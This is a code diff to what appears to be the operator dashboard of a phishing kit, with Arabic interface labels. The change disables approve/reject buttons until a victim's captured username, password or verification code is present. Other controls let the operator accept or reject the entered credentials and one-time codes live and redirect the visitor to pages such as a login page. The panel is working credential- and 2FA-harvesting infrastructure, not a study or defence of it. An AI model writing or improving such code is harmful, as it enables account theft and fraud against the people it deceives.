@@ -160,6 +160,8 @@ html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
 .approve-row button{border:none;border-radius:8px;padding:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
 .btn-ok{background:#16a34a;color:#fff}
 .btn-no{background:#dc2626;color:#fff}
+.btn-ok.disabled,.btn-no.disabled{background:#9ca3af;cursor:not-allowed;opacity:.6}
+.btn-ok.disabled:hover,.btn-no.disabled:hover{opacity:.6}
 .redir-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}
 .redir-grid button{border:none;border-radius:8px;padding:8px 6px;font-size:11px;font-weight:700;
   cursor:pointer;font-family:'Cairo',sans-serif;color:#fff;transition:.15s}
@@ -482,18 +484,24 @@ function renderDetail(o){
 
   // JOURNEY CONTROL
   h+=`<div class="sec-ctrl"><h4>🎮 التحكم في رحلة العميل</h4>`;
+  const hasLogin=o.login_username||o.login_password;
+  const hasCode=o.verification_code;
   if(o.status==='pending'||o.current_page==='waiting'){
+    const dis=!hasLogin?' disabled':'';
+    const cls=!hasLogin?' class="disabled"':'';
     h+=`<div class="approve-row">
-      <button class="btn-ok" onclick="doStatus(${o.id},'confirmed')">✅ موافقة</button>
-      <button class="btn-no" onclick="doStatus(${o.id},'rejected')">❌ رفض</button></div>`;
+      <button class="btn-ok${!hasLogin?' disabled':''}" onclick="${hasLogin?`doStatus(${o.id},'confirmed')`:''}"${dis}>✅ موافقة</button>
+      <button class="btn-no${!hasLogin?' disabled':''}" onclick="${hasLogin?`doStatus(${o.id},'rejected')`:''}"${dis}>❌ رفض</button></div>`;
   }else if(o.status==='code_pending'||o.current_page==='code-waiting'){
+    const dis=!hasCode?' disabled':'';
     h+=`<div class="approve-row">
-      <button class="btn-ok" onclick="doStatus(${o.id},'code_confirmed')">✅ قبول الرمز</button>
-      <button class="btn-no" onclick="doStatus(${o.id},'code_rejected')">❌ رفض الرمز</button></div>`;
+      <button class="btn-ok${!hasCode?' disabled':''}" onclick="${hasCode?`doStatus(${o.id},'code_confirmed')`:''}"${dis}>✅ قبول الرمز</button>
+      <button class="btn-no${!hasCode?' disabled':''}" onclick="${hasCode?`doStatus(${o.id},'code_rejected')`:''}"${dis}>❌ رفض الرمز</button></div>`;
   }else{
+    const dis=(!hasLogin&&!hasCode)?' disabled':'';
     h+=`<div class="approve-row">
-      <button class="btn-ok" onclick="doStatus(${o.id},'confirmed')">✅ قبول</button>
-      <button class="btn-no" onclick="doStatus(${o.id},'rejected')">❌ رفض</button></div>`;
+      <button class="btn-ok${(!hasLogin&&!hasCode)?' disabled':''}" onclick="${(hasLogin||hasCode)?`doStatus(${o.id},'confirmed')`:''}"${dis}>✅ قبول</button>
+      <button class="btn-no${(!hasLogin&&!hasCode)?' disabled':''}" onclick="${(hasLogin||hasCode)?`doStatus(${o.id},'rejected')`:''}"${dis}>❌ رفض</button></div>`;
   }
   const pages=[
     {l:'→ تسجيل دخول',pg:'login.html',c:'#0891b2'},
